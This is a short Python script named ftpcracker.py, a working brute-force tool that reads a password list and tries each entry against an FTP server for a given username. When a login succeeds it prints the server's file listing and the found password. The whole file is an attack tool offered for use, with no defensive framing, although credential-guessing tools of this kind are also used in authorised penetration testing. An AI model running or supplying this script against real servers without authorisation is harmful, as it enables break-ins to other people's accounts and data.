#!/usr/bin/env python3

import sys
import ftplib

if len(sys.argv) < 3:
    print("Usage: python3 ftpcracker.py <FTP_server_IP> <username> <passwords-file-location>  \n Example: python3 ftpcracker.py 10.10.11.22 administrator ./passwords.txt \n");
    sys.exit()

FTP_HOST = sys.argv[1]
FTP_USER = sys.argv[2]

# if a non-default port is used, you can change it here
ftp = ftplib.FTP(FTP_HOST)
ftp.encoding = "utf-8"



pwlist = open(sys.argv[3]).read().split("\n")
for pw in pwlist:
    try:
        print("Attempting to login with the password: "+str(pw))
        ftp.login(FTP_USER,pw)
    # wrong password error
    except ftplib.error_perm:
        continue
    else:
        print(ftp.nlst())
        print("Success: password is " + str(pw))
        sys.exit()

# close the connection
ftp.close()
